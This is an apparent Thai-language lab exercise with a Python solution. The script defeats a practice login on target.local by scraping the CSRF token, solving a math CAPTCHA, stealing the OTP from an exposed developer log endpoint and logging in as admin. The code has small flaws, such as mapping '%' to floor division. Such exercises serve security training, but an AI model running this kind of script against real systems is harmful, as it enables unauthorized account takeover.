# ภารกิจที่ 2: The Multi-Step Ninja (Session & Scraping)

# สถานการณ์: คุณต้องล็อกอินเข้าสู่ระบบหลังบ้าน แต่ระบบนี้มีการป้องกันถึง 3 ชั้น ได้แก่ CSRF Token, CAPTCHA แบบตัวเลขคณิตศาสตร์ข้อความ, และ 2FA PIN (ที่ถูกจำลองว่าส่งมาโชว์ที่อีกหน้าเว็บนึง)
# ขั้นตอนที่ระบบต้องการ:
# เข้าไปที่ http://target.local/login -> ระบบจะสุ่ม CSRF Token และมีข้อความเช่น <span id="math-captcha">What is 15 + 7?</span>
# คุณต้องส่ง POST request กลับไปพร้อมกับ username, password, csrf_token, และ captcha_answer (คำตอบที่คำนวณได้)
# หากผ่าน จะถูก Redirect ไปที่ /verify-2fa
# คุณต้องแอบยิง GET request ไปที่ http://target.local/api/dev-otp-log เพื่อขโมยรหัส OTP ล่าสุด (เป็น JSON)
# นำ OTP กลับมา POST ใส่หน้า /verify-2fa เพื่อเข้าถึงระบบ

# โจทย์:
# จงเขียนโค้ด Python ที่ผ่านด่านทั้ง 5 ข้อนี้แบบรวดเดียวจบ (One-click exploit)
# คำใบ้: requests.Session() คือหัวใจสำคัญในการจำ State และ Cookie ส่วนการดึง CSRF กับโจทย์เลข ต้องพึ่ง BeautifulSoup หรือ re

#CSRF Token = OTP ประจำหน้าเว็บ หากรีเว็บก็จะเปลี่ยน ป้องกัน hacker นำ payload จาก หน้าเว็บที่ไม่ใช่ของเหยื่อส่งมา

import requests
import re
import json

session = requests.Session()
token=''

login_url="http://target.local/login"
log_url="http://target.local/api/dev-otp-log"
twoft_url="http://target.local/verify-2fa"


try:
    response= session.get(login_url,timeout=1)
    pattern_token = r'name="csrf_token" value="(.*?)"'
    pattern_math_captcha = r'What is (.*?)\?'
    match_token = re.search(pattern_token,response.text)
    match_captcha = re.search(pattern_math_captcha,response.text)

    if match_token :
        token = match_token.group(1)

    if match_captcha:
        captcha_obj = match_captcha.group(1)
        captcha_obj=captcha_obj.split(" ")
        if captcha_obj[1]=="+":
            captcha_ans=int(captcha_obj[0])+int(captcha_obj[2])
        elif captcha_obj[1]=="-":
            captcha_ans=int(captcha_obj[0])-int(captcha_obj[2])
        elif captcha_obj[1]=="*":
            captcha_ans=int(captcha_obj[0])*int(captcha_obj[2])
        elif captcha_obj[1]=="%":
            captcha_ans=int(captcha_obj[0])//int(captcha_obj[2])

except requests.Timeout :
    print("Time out, please try again later.")

data_to_send_login = {
    "username":"admin",
    "password":"P@ssw0rd",
    "csrf_token":token,
    "captcha_answer":str(captcha_ans)
}

try:
    response_login = session.post(url=login_url,data=data_to_send_login,timeout=1)
    if "/verify-2fa" in response_login.text or "2FA" in response_login.text:
        otp_log = session.get(log_url)
        otp_data = otp_log.json()
        otp= otp_data[-1]["otp"]

        data_to_send_otp = {
        "otp":otp
        }    
        response = session.post(twoft_url,data_to_send_otp,timeout=1)
        if "Welcome" in response.text :
            print("[!!!] Successfully login")
    else:
        print("[-] invalid token or captcha answer!")

except requests.Timeout:
    print("Time out, please try again later.")



